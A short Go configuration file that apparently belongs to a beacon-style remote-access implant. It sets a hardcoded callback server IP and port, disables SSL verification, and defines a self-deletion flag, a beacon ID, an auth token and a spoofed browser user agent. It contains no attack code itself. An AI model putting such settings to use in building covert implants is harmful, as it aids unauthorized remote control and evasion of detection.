package config

import (
	"time"
)

var (
	ServerHost                    = "121.36.61.196"
	ServerPort                    = 5004
	IgnoreSSLVerify               = true
	TimeOut         time.Duration = 5 * time.Second
	DownloadSize                  = 1024 * 1024 * 5
	DeleteSelf                    = false
	ProxyUrl                      = ""
	HeaconId                      = ""
	Auth                          = ""
	UserAgent                     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
	MaxRetries                    = 10
	Debug                         = true
)
